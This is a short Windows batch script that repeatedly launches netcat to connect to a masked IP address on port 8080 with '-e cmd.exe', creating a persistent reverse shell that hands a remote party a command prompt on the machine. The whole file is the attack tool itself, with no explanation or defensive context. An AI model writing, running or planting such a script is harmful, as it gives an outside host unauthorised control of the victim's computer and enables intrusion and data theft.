@echo off
cls
:start
cd C:\Program Files
nc.exe -nv ***.***.***.*** 8080 -e cmd.exe
goto start
